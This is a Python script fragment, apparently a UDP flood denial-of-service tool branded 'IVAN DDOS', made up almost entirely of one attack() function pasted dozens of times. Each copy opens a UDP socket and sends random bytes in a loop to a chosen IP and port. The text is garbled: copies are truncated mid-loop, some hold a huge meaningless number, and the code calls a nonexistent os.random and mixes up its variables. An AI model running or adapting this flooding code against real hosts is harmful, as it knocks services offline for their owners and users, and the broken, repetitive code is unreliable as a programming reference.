    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
